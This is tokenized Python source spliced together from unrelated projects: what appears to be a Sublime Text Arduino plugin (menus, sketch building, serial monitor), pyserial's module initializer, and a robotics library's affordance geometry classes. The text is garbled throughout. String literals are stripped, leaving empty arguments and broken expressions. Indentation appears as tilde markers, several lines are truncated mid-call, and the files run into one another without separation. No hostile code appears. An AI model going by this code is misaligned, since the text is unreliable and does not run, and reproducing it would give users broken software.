for root in arduino_info . get_root_dirs ( ) : \n 
~~~ libraries = root . get_libraries ( ) \n 
for library in libraries : \n 
~~~ keywords += library . get_keywords ( ) \n 
~~ for package in root . get_packages ( ) : \n 
~~~ for platform in package . get_platforms ( ) : \n 
~~~ libraries = platform . get_libraries ( ) \n 
for library in libraries : \n 
~~~ keywords += library . get_keywords ( ) \n 
~~ ~~ ~~ ~~ return keywords \n 
\n 
\n 
~~ def create_completions ( ) : \n 
~~~ user_path = st_base . get_stino_user_path ( ) \n 
file_path = os . path . join ( user_path , ) \n 
completions_file = pyarduino . base . json_file . JSONFile ( file_path ) \n 
\n 
cpp_keywords = [ , , , , ] \n 
cpp_keywords += [ , , , , ] \n 
\n 
keywords = load_keywords ( ) \n 
keyword_ids = [ k . get_id ( ) for k in keywords ] \n 
keyword_ids += cpp_keywords \n 
\n 
completions_dict = { : } \n 
completions_dict [ ] = keyword_ids \n 
completions_file . set_data ( completions_dict ) \n 
\n 
\n 
~~ def create_syntax_file ( ) : \n 
~~~ keywords = load_keywords ( ) \n 
LITERAL1s = [ k . get_id ( ) for k in keywords if k . get_type ( ) == ] \n 
KEYWORD1s = [ k . get_id ( ) for k in keywords if k . get_type ( ) == ] \n 
KEYWORD2s = [ k . get_id ( ) for k in keywords if k . get_type ( ) == ] \n 
KEYWORD3s = [ k . get_id ( ) for k in keywords if k . get_type ( ) == ] \n 
LITERAL1_text = . join ( LITERAL1s ) \n 
KEYWORD1_text = . join ( KEYWORD1s ) \n 
KEYWORD2_text = . join ( KEYWORD2s ) \n 
KEYWORD3_text = . join ( KEYWORD3s ) \n 
\n 
preset_path = st_base . get_preset_path ( ) \n 
file_path = os . path . join ( preset_path , ) \n 
template_file = pyarduino . base . abs_file . File ( file_path ) \n 
text = template_file . read ( ) \n 
text = text . replace ( , LITERAL1_text ) \n 
text = text . replace ( , KEYWORD1_text ) \n 
text = text . replace ( , KEYWORD2_text ) \n 
text = text . replace ( , KEYWORD3_text ) \n 
\n 
user_path = st_base . get_stino_user_path ( ) \n 
file_path = os . path . join ( user_path , ) \n 
syntax_file = pyarduino . base . abs_file . File ( file_path ) \n 
syntax_file . write ( text ) \n 
\n 
\n 
~~ def create_sub_menus ( ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
st_menu . create_sketchbook_menu ( arduino_info ) \n 
st_menu . create_examples_menu ( arduino_info ) \n 
st_menu . create_libraries_menu ( arduino_info ) \n 
st_menu . create_boards_menu ( arduino_info ) \n 
st_menu . create_board_options_menu ( arduino_info ) \n 
st_menu . create_programmers_menu ( arduino_info ) \n 
st_menu . create_serials_menu ( ) \n 
st_menu . create_languages_menu ( ) \n 
\n 
\n 
~~ def create_menus ( ) : \n 
~~~ st_menu . create_main_menu ( ) \n 
settings = st_base . get_settings ( ) \n 
show_arduino_menu = settings . get ( , True ) \n 
if show_arduino_menu : \n 
~~~ st_menu . create_arduino_menu ( ) \n 
create_sub_menus ( ) \n 
~~ else : \n 
~~~ user_menu_path = st_base . get_user_menu_path ( ) \n 
if os . path . isdir ( user_menu_path ) : \n 
~~~ shutil . rmtree ( user_menu_path ) \n 
\n 
\n 
~~ ~~ ~~ def update_menu ( ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
arduino_info . reload ( ) \n 
arduino_info . update ( ) \n 
i18n = st_base . get_i18n ( ) \n 
i18n . load ( ) \n 
create_menus ( ) \n 
create_completions ( ) \n 
create_syntax_file ( ) \n 
\n 
\n 
~~ def create_sketch ( sketch_name ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
sketchbook_dir = arduino_info . get_sketchbook_dir ( ) \n 
sketchbook_path = sketchbook_dir . get_path ( ) \n 
sketch_path = os . path . join ( sketchbook_path , sketch_name ) \n 
\n 
index = 0 \n 
org_name = sketch_name \n 
while os . path . exists ( sketch_path ) : \n 
~~~ sketch_name = % ( org_name , index ) \n 
sketch_path = os . path . join ( sketchbook_path , sketch_name ) \n 
index += 1 \n 
~~ os . makedirs ( sketch_path ) \n 
\n 
settings = st_base . get_settings ( ) \n 
bare_gcc = settings . get ( , False ) \n 
\n 
if bare_gcc : \n 
~~~ ext = \n 
~~ else : \n 
~~~ ext = \n 
\n 
~~ template_file_name = + ext \n 
preset_path = st_base . get_preset_path ( ) \n 
template_file_path = os . path . join ( preset_path , template_file_name ) \n 
template_file = pyarduino . base . abs_file . File ( template_file_path ) \n 
src_code = template_file . read ( ) \n 
\n 
src_file_name = sketch_name + ext \n 
src_file_path = os . path . join ( sketch_path , src_file_name ) \n 
src_file = pyarduino . base . abs_file . File ( src_file_path ) \n 
\n 
src_code = src_code . replace ( , src_file_name ) \n 
src_file . write ( src_code ) \n 
\n 
arduino_info . reload ( ) \n 
arduino_info . update ( ) \n 
st_menu . create_sketchbook_menu ( arduino_info ) \n 
return sketch_path \n 
\n 
\n 
~~ def new_sketch ( window , sketch_name ) : \n 
~~~ sketch_path = create_sketch ( sketch_name ) \n 
open_sketch ( window , sketch_path ) \n 
\n 
\n 
~~ def open_sketch ( window , sketch_path ) : \n 
~~~ project = pyarduino . arduino_project . Project ( sketch_path ) \n 
ino_files = project . list_ino_files ( ) \n 
cpp_files = project . list_cpp_files ( ) \n 
h_files = project . list_h_files ( ) \n 
files = ino_files + cpp_files + h_files \n 
\n 
views = [ ] \n 
for f in files : \n 
~~~ view = window . open_file ( f . get_path ( ) ) \n 
views . append ( view ) \n 
~~ if views : \n 
~~~ window . focus_view ( views [ 0 ] ) \n 
\n 
~~ project_params = window . project_data ( ) \n 
if project_params is None : \n 
~~~ project_params = { } \n 
~~ folders = project_params . setdefault ( , [ ] ) \n 
folders . append ( { : True , : sketch_path } ) \n 
project_params [ ] = folders \n 
window . set_project_data ( project_params ) \n 
\n 
\n 
~~ def import_library ( view , edit , library_path ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
target_arch = arduino_info . get_target_board_info ( ) . get_target_arch ( ) \n 
library = pyarduino . arduino_library . Library ( library_path ) \n 
h_files = library . list_h_files ( target_arch ) \n 
\n 
region = sublime . Region ( 0 , view . size ( ) ) \n 
src_text = view . substr ( region ) \n 
headers = pyarduino . arduino_src . list_headers_from_src ( src_text ) \n 
h_files = [ f for f in h_files if not f . get_name ( ) in headers ] \n 
\n 
includes = [ % f . get_name ( ) for f in h_files ] \n 
text = . join ( includes ) \n 
if text : \n 
~~~ text += \n 
~~ view . insert ( edit , 0 , text ) \n 
\n 
\n 
~~ def handle_sketch ( view , func , using_programmer = False ) : \n 
~~~ window = view . window ( ) \n 
views = window . views ( ) \n 
if view not in views : \n 
~~~ view = window . active_view ( ) \n 
~~ if view . file_name ( ) is None : \n 
~~~ tmp_path = pyarduino . base . sys_path . get_tmp_path ( ) \n 
tmp_path = os . path . join ( tmp_path , ) \n 
name = str ( time . time ( ) ) . split ( ) [ 1 ] \n 
sketch_path = os . path . join ( tmp_path , name ) \n 
os . makedirs ( sketch_path ) \n 
\n 
settings = st_base . get_settings ( ) \n 
bare_gcc = settings . get ( , False ) \n 
if bare_gcc : \n 
~~~ ext = \n 
~~ else : \n 
~~~ ext = \n 
~~ src_file_name = name + ext \n 
src_file_path = os . path . join ( sketch_path , src_file_name ) \n 
\n 
region = sublime . Region ( 0 , view . size ( ) ) \n 
text = view . substr ( region ) \n 
src_file = pyarduino . base . abs_file . File ( src_file_path ) \n 
src_file . write ( text ) \n 
\n 
view . set_scratch ( True ) \n 
window = view . window ( ) \n 
window . run_command ( ) \n 
view = window . open_file ( src_file_path ) \n 
\n 
~~ if view . is_dirty ( ) : \n 
~~~ view . run_command ( ) \n 
~~ file_path = view . file_name ( ) \n 
sketch_path = os . path . dirname ( file_path ) \n 
func ( view , sketch_path , using_programmer ) \n 
\n 
\n 
~~ def build_sketch ( view , sketch_path , using_programmer = False ) : \n 
~~~ window = view . window ( ) \n 
console_name = + sketch_path + + str ( time . time ( ) ) \n 
console = st_console . Console ( window , name = console_name ) \n 
compiler = pyarduino . arduino_compiler . Compiler ( sketch_path , console ) \n 
compiler . build ( ) \n 
\n 
\n 
~~ def upload_sketch ( view , sketch_path , using_programmer ) : \n 
~~~ window = view . window ( ) \n 
console_name = + sketch_path + + str ( time . time ( ) ) \n 
console = st_console . Console ( window , name = console_name ) \n 
uploader = pyarduino . arduino_uploader . Uploader ( sketch_path , console ) \n 
uploader . upload ( using_programmer ) \n 
\n 
\n 
~~ def burn_bootloader ( window ) : \n 
~~~ console_name = + str ( time . time ( ) ) \n 
console = st_console . Console ( window , name = console_name ) \n 
bootloader = pyarduino . arduino_bootloader . Bootloader ( console ) \n 
bootloader . burn ( ) \n 
\n 
\n 
~~ def change_board ( window , board_id ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
arduino_info . change_board ( board_id ) \n 
st_menu . create_board_options_menu ( arduino_info ) \n 
view = window . active_view ( ) \n 
set_status ( view ) \n 
\n 
\n 
~~ def change_sub_board ( window , option_index , sub_board_id ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
arduino_info . change_sub_board ( option_index , sub_board_id ) \n 
view = window . active_view ( ) \n 
set_status ( view ) \n 
\n 
\n 
~~ def change_programmer ( programmer_id ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
arduino_info . change_programmer ( programmer_id ) \n 
\n 
\n 
~~ def archive_sketch ( window , sketch_path ) : \n 
~~~ sketch_name = os . path . basename ( sketch_path ) \n 
console = st_console . Console ( window , str ( time . time ( ) ) ) \n 
message_queue = pyarduino . base . message_queue . MessageQueue ( console ) \n 
message_queue . put ( , sketch_name ) \n 
\n 
zip_file_name = sketch_name + \n 
document_path = pyarduino . base . sys_path . get_document_path ( ) \n 
zip_file_path = os . path . join ( document_path , zip_file_name ) \n 
os . chdir ( sketch_path ) \n 
sketch_dir = pyarduino . base . abs_file . Dir ( sketch_path ) \n 
files = sketch_dir . list_files ( ) \n 
file_names = [ f . get_name ( ) for f in files ] \n 
try : \n 
~~~ opened_zipfile = zipfile . ZipFile ( zip_file_path , \n 
, zipfile . ZIP_DEFLATED ) \n 
~~ except IOError : \n 
~~~ text = \n 
text += "the sketch couldn\'t save properly.\\\\n" \n 
message_queue . put ( text ) \n 
~~ else : \n 
~~~ for file_name in file_names : \n 
~~~ opened_zipfile . write ( file_name ) \n 
~~ opened_zipfile . close ( ) \n 
message_queue . put ( , zip_file_path ) \n 
~~ message_queue . print_screen ( one_time = True ) \n 
\n 
\n 
~~ def get_url ( url ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
ide_dir = arduino_info . get_ide_dir ( ) \n 
ide_path = ide_dir . get_path ( ) \n 
\n 
file_name = url + \n 
reference_folder = os . path . join ( ide_path , ) \n 
reference_file = os . path . join ( reference_folder , file_name ) \n 
if os . path . isfile ( reference_file ) : \n 
~~~ reference_file = reference_file . replace ( os . path . sep , ) \n 
url = + reference_file \n 
~~ else : \n 
~~~ url = \n 
~~ return url \n 
\n 
\n 
~~ def find_in_ref ( view ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
ide_dir = arduino_info . get_ide_dir ( ) \n 
id_keyword_dict = ide_dir . get_id_keyword_dict ( ) \n 
\n 
ref_list = [ ] \n 
selected_text = get_selected_text_from_view ( view ) \n 
words = get_word_list_from_text ( selected_text ) \n 
for word in words : \n 
~~~ if word in id_keyword_dict : \n 
~~~ keyword = id_keyword_dict . get ( word ) \n 
ref = keyword . get_ref ( ) \n 
if ref and not ref in ref_list : \n 
~~~ ref_list . append ( ref ) \n 
~~ ~~ ~~ for ref in ref_list : \n 
~~~ url = get_url ( ref ) \n 
sublime . run_command ( , { : url } ) \n 
\n 
\n 
~~ ~~ def get_selected_text_from_view ( view ) : \n 
~~~ selected_text = \n 
region_list = view . sel ( ) \n 
for region in region_list : \n 
~~~ selected_region = view . word ( region ) \n 
selected_text += view . substr ( selected_region ) \n 
selected_text += \n 
~~ return selected_text \n 
\n 
\n 
~~ def get_word_list_from_text ( text ) : \n 
~~~ pattern_text = \n 
word_list = re . findall ( pattern_text , text ) \n 
return word_list \n 
\n 
\n 
~~ def is_arduino_ide_path ( dir_path ) : \n 
~~~ path = pyarduino . arduino_root . update_ide_path ( dir_path ) \n 
return pyarduino . arduino_root . is_arduino_ide_path ( path ) \n 
\n 
\n 
~~ def set_arduino_ide_path ( window , dir_path ) : \n 
~~~ if is_arduino_ide_path ( dir_path ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
arduino_info . change_ide_path ( dir_path ) \n 
\n 
ide_dir = arduino_info . get_ide_dir ( ) \n 
version_name = ide_dir . get_version_name ( ) \n 
text = \n 
\n 
console = st_console . Console ( window , str ( time . time ( ) ) ) \n 
message_queue = pyarduino . base . message_queue . MessageQueue ( console ) \n 
message_queue . put ( text , version_name , dir_path ) \n 
message_queue . print_screen ( one_time = True ) \n 
\n 
create_menus ( ) \n 
view = window . active_view ( ) \n 
set_status ( view ) \n 
return 0 \n 
~~ else : \n 
~~~ return 1 \n 
\n 
\n 
~~ ~~ def set_sketchbook_path ( window , dir_path ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
arduino_info . change_sketchbook_path ( dir_path ) \n 
\n 
text = \n 
console = st_console . Console ( window , str ( time . time ( ) ) ) \n 
message_queue = pyarduino . base . message_queue . MessageQueue ( console ) \n 
message_queue . put ( text , dir_path ) \n 
message_queue . print_screen ( one_time = True ) \n 
\n 
create_menus ( ) \n 
return 0 \n 
\n 
\n 
~~ def set_build_path ( window , dir_path ) : \n 
~~~ settings = st_base . get_settings ( ) \n 
settings . set ( , dir_path ) \n 
text = \n 
console = st_console . Console ( window , str ( time . time ( ) ) ) \n 
message_queue = pyarduino . base . message_queue . MessageQueue ( console ) \n 
message_queue . put ( text , dir_path ) \n 
message_queue . print_screen ( one_time = True ) \n 
return 0 \n 
\n 
\n 
~~ def select_arduino_dir ( window ) : \n 
~~~ select_dir ( window , func = set_arduino_ide_path , \n 
condition_func = is_arduino_ide_path ) \n 
\n 
\n 
~~ def change_sketchbook_dir ( window ) : \n 
~~~ select_dir ( window , func = set_sketchbook_path , is_user = True ) \n 
\n 
\n 
~~ def change_build_dir ( window ) : \n 
~~~ select_dir ( window , func = set_build_path , is_user = True ) \n 
\n 
\n 
~~ def select_dir ( window , index = - 2 , level = 0 , paths = None , \n 
func = None , condition_func = None , is_user = False ) : \n 
~~~ if index == - 1 : \n 
~~~ return \n 
\n 
~~ if level > 0 and index == 0 : \n 
~~~ sel_path = paths [ 0 ] . split ( ) [ 1 ] [ : - 1 ] \n 
if func : \n 
~~~ return_code = func ( window , sel_path ) \n 
if return_code == 0 : \n 
~~~ return \n 
~~ ~~ else : \n 
~~~ return \n 
~~ ~~ else : \n 
~~~ if index == 1 : \n 
~~~ level -= 1 \n 
~~ elif index > 1 : \n 
~~~ level += 1 \n 
\n 
~~ if level <= 0 : \n 
~~~ level = 0 \n 
dir_path = \n 
parent_path = \n 
if is_user : \n 
~~~ paths = pyarduino . base . sys_path . list_user_root_path ( ) \n 
~~ else : \n 
~~~ paths = pyarduino . base . sys_path . list_os_root_path ( ) \n 
~~ ~~ else : \n 
~~~ sel_path = paths [ index ] \n 
if sel_path == pyarduino . base . sys_path . ROOT_PATH : \n 
~~~ sel_path = \n 
~~ dir_path = os . path . abspath ( sel_path ) \n 
if condition_func and condition_func ( dir_path ) : \n 
~~~ func ( window , dir_path ) \n 
return \n 
~~ parent_path = os . path . join ( dir_path , ) \n 
\n 
cur_dir = pyarduino . base . abs_file . Dir ( dir_path ) \n 
sub_dirs = cur_dir . list_dirs ( ) \n 
paths = [ d . get_path ( ) for d in sub_dirs ] \n 
~~ paths . insert ( 0 , parent_path ) \n 
paths . insert ( 0 , % dir_path ) \n 
\n 
~~ sublime . set_timeout ( lambda : window . show_quick_panel ( \n 
paths , lambda index : select_dir ( window , index , level , paths , \n 
func , condition_func , is_user ) ) , 5 ) \n 
\n 
\n 
~~ def update_serial_info ( ) : \n 
~~~ st_menu . create_serials_menu ( ) \n 
window = sublime . active_window ( ) \n 
view = window . active_view ( ) \n 
set_status ( view ) \n 
\n 
\n 
~~ def get_serial_listener ( ) : \n 
~~~ serial_listener = pyarduino . base . serial_listener . SerialListener ( \n 
func = update_serial_info ) \n 
return serial_listener \n 
\n 
\n 
~~ def toggle_serial_monitor ( window ) : \n 
~~~ monitor_module = pyarduino . base . serial_monitor \n 
serial_monitor = None \n 
\n 
settings = st_base . get_settings ( ) \n 
serial_port = settings . get ( , ) \n 
serial_ports = pyarduino . base . serial_port . list_serial_ports ( ) \n 
if serial_port in serial_ports : \n 
~~~ if serial_port in monitor_module . serials_in_use : \n 
~~~ serial_monitor = monitor_module . serial_monitor_dict . get ( \n 
serial_port , None ) \n 
~~ if not serial_monitor : \n 
~~~ monitor_view = st_console . MonitorView ( window , serial_port ) \n 
serial_monitor = pyarduino . base . serial_monitor . SerialMonitor ( \n 
serial_port , monitor_view ) \n 
\n 
~~ if not serial_monitor . is_running ( ) : \n 
~~~ serial_monitor . start ( ) \n 
if not serial_port in monitor_module . serials_in_use : \n 
~~~ monitor_module . serials_in_use . append ( serial_port ) \n 
~~ monitor_module . serial_monitor_dict [ serial_port ] = serial_monitor \n 
~~ else : \n 
~~~ serial_monitor . stop ( ) \n 
monitor_module . serials_in_use . remove ( serial_port ) \n 
\n 
\n 
~~ ~~ ~~ def send_serial_message ( text ) : \n 
~~~ monitor_module = pyarduino . base . serial_monitor \n 
\n 
settings = st_base . get_settings ( ) \n 
serial_port = settings . get ( , ) \n 
if serial_port in monitor_module . serials_in_use : \n 
~~~ serial_monitor = monitor_module . serial_monitor_dict . get ( \n 
serial_port , None ) \n 
if serial_monitor and serial_monitor . is_running ( ) : \n 
~~~ serial_monitor . send ( text ) \n 
\n 
\n 
~~ ~~ ~~ def set_status ( view ) : \n 
~~~ infos = [ ] \n 
exts = [ , , , , ] \n 
file_name = view . file_name ( ) \n 
if file_name and file_name . split ( ) [ - 1 ] in exts : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
version_name = arduino_info . get_ide_dir ( ) . get_version_name ( ) \n 
version_text = % version_name \n 
infos . append ( version_text ) \n 
\n 
target_board_info = arduino_info . get_target_board_info ( ) \n 
target_board = target_board_info . get_target_board ( ) \n 
if target_board : \n 
~~~ target_board_caption = target_board . get_caption ( ) \n 
infos . append ( target_board_caption ) \n 
\n 
if target_board . has_options ( ) : \n 
~~~ target_sub_boards = target_board_info . get_target_sub_boards ( ) \n 
for index , target_sub_board in enumerate ( target_sub_boards ) : \n 
~~~ caption_text = target_sub_board . get_caption ( ) \n 
if index == 0 : \n 
~~~ caption_text = + caption_text \n 
~~ if index == len ( target_sub_boards ) - 1 : \n 
~~~ caption_text += \n 
~~ infos . append ( caption_text ) \n 
~~ ~~ ~~ else : \n 
~~~ target_board_caption = \n 
infos . append ( target_board_caption ) \n 
\n 
~~ settings = st_base . get_settings ( ) \n 
target_serial_port = settings . get ( , ) \n 
serial_ports = pyarduino . base . serial_port . list_serial_ports ( ) \n 
if not target_serial_port in serial_ports : \n 
~~~ target_serial_port = \n 
~~ serial_text = % target_serial_port \n 
infos . append ( serial_text ) \n 
\n 
text = . join ( infos ) \n 
view . set_status ( , text ) \n 
\n 
\n 
~~ ~~ def show_items_panel ( window , item_type ) : \n 
~~~ sublime . set_timeout ( lambda : window . show_quick_panel ( [ , ] , ppp ) ) \n 
\n 
\n 
~~ def ppp ( index ) : \n 
~~~ print ( index ) \n 
#!/usr/bin/env python  \n 
\n 
# portable serial port access with python \n 
# this is a wrapper module for different platform implementations \n 
# \n 
# (C) 2001-2010 Chris Liechti <cliechti@gmx.net> \n 
# this is distributed under a free software license, see license.txt \n 
\n 
~~ VERSION = \n 
\n 
import sys \n 
\n 
\n 
import os \n 
# chose an implementation, depending on os \n 
if os . name == : \n 
~~~ from . serialwin32 import * \n 
~~ elif os . name == : \n 
~~~ from . serialposix import * \n 
~~ else : \n 
~~~ raise ImportError ( "Sorry: no implementation for your platform (\'%s\') available" % ( os . name , ) ) \n 
\n 
\n 
~~ protocol_handler_packages = [ \n 
, \n 
] \n 
\n 
def serial_for_url ( url , * args , ** kwargs ) : \n 
~~~ """\\\n    Get an instance of the Serial class, depending on port/url. The port is not\n    opened when the keyword parameter \'do_not_open\' is true, by default it\n    is. All other parameters are directly passed to the __init__ method when\n    the port is instantiated.\n\n    The list of package names that is searched for protocol handlers is kept in\n    ``protocol_handler_packages``.\n\n    e.g. we want to support a URL ``foobar://``. A module\n    ``my_handlers.protocol_foobar`` is provided by the user. Then\n    ``protocol_handler_packages.append("my_handlers")`` would extend the search\n    path so that ``serial_for_url("foobar://"))`` would work.\n    """ \n 
# check remove extra parameter to not confuse the Serial class \n 
do_open = not in kwargs or not kwargs [ ] \n 
if in kwargs : del kwargs [ ] \n 
# the default is to use the native version \n 
klass = Serial \n 
# check port type and get class \n 
try : \n 
~~~ url_nocase = url . lower ( ) \n 
~~ except AttributeError : \n 
\n 
~~~ pass \n 
~~ else : \n 
~~~ if in url_nocase : \n 
~~~ protocol = url_nocase . split ( , 1 ) [ 0 ] \n 
for package_name in protocol_handler_packages : \n 
~~~ module_name = % ( package_name , protocol , ) \n 
try : \n 
~~~ handler_module = __import__ ( module_name ) \n 
~~ except ImportError : \n 
~~~ pass \n 
~~ else : \n 
~~~ klass = sys . modules [ module_name ] . Serial \n 
break \n 
~~ ~~ else : \n 
~~~ raise ValueError ( % ( protocol , ) ) \n 
~~ ~~ else : \n 
~~~ klass = Serial \n 
# instantiate and open when desired \n 
~~ ~~ instance = klass ( None , * args , ** kwargs ) \n 
instance . port = url \n 
if do_open : \n 
~~~ instance . open ( ) \n 
~~ return instance \n 
~~ import director \n 
import director . objectmodel as om \n 
from director import visualization as vis \n 
from director . visualization import PolyDataItem \n 
from director import filterUtils \n 
from director import ioUtils \n 
from director import meshmanager \n 
from director import transformUtils \n 
from director . uuidutil import newUUID \n 
from director . debugVis import DebugData \n 
from director import vtkAll as vtk \n 
import numpy as np \n 
\n 
import os \n 
import uuid \n 
from collections import OrderedDict \n 
\n 
\n 
class AffordanceItem ( PolyDataItem ) : \n 
\n 
~~~ COPY_MODE_ALL = 0 # copies all properties from affordance descriptions \n 
COPY_MODE_SKIP_LOCAL = 1 # skips properties that should keep local values such as visibility \n 
LOCAL_PROPERTY_NAMES = ( ) \n 
\n 
def __init__ ( self , name , polyData , view ) : \n 
~~~ PolyDataItem . __init__ ( self , name , polyData , view ) \n 
self . params = { } \n 
self . addProperty ( , newUUID ( ) , attributes = om . PropertyAttributes ( hidden = True ) ) \n 
self . addProperty ( , True ) \n 
self . addProperty ( , [ 0.0 , 0.0 , 0.0 , 1.0 , 0.0 , 0.0 , 0.0 ] , attributes = om . PropertyAttributes self . addProperty ( , False ) \n 
\n 
self . properties . setPropertyIndex ( , 0 ) \n 
self . setProperty ( , om . Icons . Hammer ) \n 
\n 
~~ def getPose ( self ) : \n 
~~~ childFrame = self . getChildFrame ( ) \n 
t = childFrame . transform if childFrame else vtk . vtkTransform ( ) \n 
return transformUtils . poseFromTransform ( t ) \n 
\n 
~~ def getDescription ( self ) : \n 
~~~ d = OrderedDict ( ) \n 
d [ ] = type ( self ) . __name__ \n 
d . update ( self . properties . _properties ) \n 
d [ ] = self . getPose ( ) \n 
return d \n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ PolyDataItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
if propertyName == : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
~~ ~~ def updateGeometryFromProperties ( ) : \n 
~~~ pass \n 
\n 
~~ def setPolyData ( self , polyData ) : \n 
\n 
~~~ if polyData . GetNumberOfPoints ( ) : \n 
~~~ originPose = self . getProperty ( ) \n 
pos , quat = originPose [ : 3 ] , originPose [ 3 : ] \n 
t = transformUtils . transformFromPose ( pos , quat ) \n 
polyData = filterUtils . transformPolyData ( polyData , t . GetLinearInverse ( ) ) \n 
~~ PolyDataItem . setPolyData ( self , polyData ) \n 
\n 
~~ def repositionFromDescription ( self , desc ) : \n 
~~~ position , quat = desc [ ] \n 
t = transformUtils . transformFromPose ( position , quat ) \n 
self . getChildFrame ( ) . copyFrame ( t ) \n 
\n 
~~ def loadDescription ( self , desc , copyMode = COPY_MODE_ALL ) : \n 
~~~ self . syncProperties ( desc , copyMode ) \n 
self . repositionFromDescription ( desc ) \n 
self . _renderAllViews ( ) \n 
\n 
~~ def syncProperties ( self , desc , copyMode = COPY_MODE_ALL ) : \n 
~~~ for propertyName , propertyValue in desc . iteritems ( ) : \n 
~~~ if copyMode == self . COPY_MODE_SKIP_LOCAL : \n 
~~~ if propertyName in self . LOCAL_PROPERTY_NAMES : \n 
~~~ continue \n 
\n 
~~ ~~ if self . hasProperty ( propertyName ) and ( self . getProperty ( propertyName ) != propertyValue ) : \n 
~~~ self . setProperty ( propertyName , propertyValue ) \n 
\n 
~~ ~~ ~~ def onRemoveFromObjectModel ( self ) : \n 
~~~ PolyDataItem . onRemoveFromObjectModel ( self ) \n 
\n 
\n 
~~ ~~ class BoxAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ def __init__ ( self , name , view ) : \n 
~~~ AffordanceItem . __init__ ( self , name , vtk . vtkPolyData ( ) , view ) \n 
self . addProperty ( , [ 0.25 , 0.25 , 0.25 ] , attributes = om . PropertyAttributes ( decimals self . addProperty ( , 0 , attributes = om . PropertyAttributes ( minimum = 0 , maximum = 1000 self . properties . setPropertyIndex ( , 0 ) \n 
self . properties . setPropertyIndex ( , 1 ) \n 
self . updateGeometryFromProperties ( ) \n 
\n 
~~ def updateGeometryFromProperties ( self ) : \n 
~~~ d = DebugData ( ) \n 
d . addCube ( self . getProperty ( ) , ( 0 , 0 , 0 ) , subdivisions = self . getProperty ( self . setPolyData ( d . getPolyData ( ) ) \n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ AffordanceItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
\n 
if propertyName in ( , ) : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ ~~ class SphereAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ def __init__ ( self , name , view ) : \n 
~~~ AffordanceItem . __init__ ( self , name , vtk . vtkPolyData ( ) , view ) \n 
self . addProperty ( , 0.15 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 0.01 self . properties . setPropertyIndex ( , 0 ) \n 
self . updateGeometryFromProperties ( ) \n 
\n 
~~ def updateGeometryFromProperties ( self ) : \n 
~~~ d = DebugData ( ) \n 
d . addSphere ( ( 0 , 0 , 0 ) , self . getProperty ( ) ) \n 
self . setPolyData ( d . getPolyData ( ) ) \n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ AffordanceItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
\n 
if propertyName == : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ ~~ class CylinderAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ def __init__ ( self , name , view ) : \n 
~~~ AffordanceItem . __init__ ( self , name , vtk . vtkPolyData ( ) , view ) \n 
self . addProperty ( , 0.03 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 0.01 self . addProperty ( , 0.5 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 0.01 self . properties . setPropertyIndex ( , 0 ) \n 
self . properties . setPropertyIndex ( , 1 ) \n 
self . updateGeometryFromProperties ( ) \n 
\n 
~~ def updateGeometryFromProperties ( self ) : \n 
~~~ d = DebugData ( ) \n 
length = self . getProperty ( ) \n 
d . addCylinder ( center = ( 0 , 0 , 0 ) , axis = ( 0 , 0 , 1 ) , length = self . getProperty ( ) , radius = self . getProperty self . setPolyData ( d . getPolyData ( ) ) \n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ AffordanceItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
\n 
if propertyName in ( , ) : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ ~~ class CapsuleAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ def __init__ ( self , name , view ) : \n 
~~~ AffordanceItem . __init__ ( self , name , vtk . vtkPolyData ( ) , view ) \n 
self . addProperty ( , 0.03 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 0.01 self . addProperty ( , 0.5 , attributes = om . PropertyAttributes ( decimals = 3 , singleStep = 0.01 self . properties . setPropertyIndex ( , 0 ) \n 
self . properties . setPropertyIndex ( , 1 ) \n 
self . updateGeometryFromProperties ( ) \n 
\n 
~~ def updateGeometryFromProperties ( self ) : \n 
~~~ d = DebugData ( ) \n 
length = self . getProperty ( ) \n 
d . addCapsule ( center = ( 0 , 0 , 0 ) , axis = ( 0 , 0 , 1 ) , length = self . getProperty ( ) , radius = self . getProperty self . setPolyData ( d . getPolyData ( ) ) \n 
\n 
~~ def _onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ AffordanceItem . _onPropertyChanged ( self , propertySet , propertyName ) \n 
\n 
if propertyName in ( , ) : \n 
~~~ self . updateGeometryFromProperties ( ) \n 
\n 
\n 
~~ ~~ ~~ class CapsuleRingAffordanceItem ( AffordanceItem ) : \n 
\n 
~~~ def __init__ ( self , name , view ) : \n 
~~~ AffordanceItem . __init__ ( self , name , vtk . vtkPolyData ( ) , view ) \n 
self . setProperty ( , False ) \n 
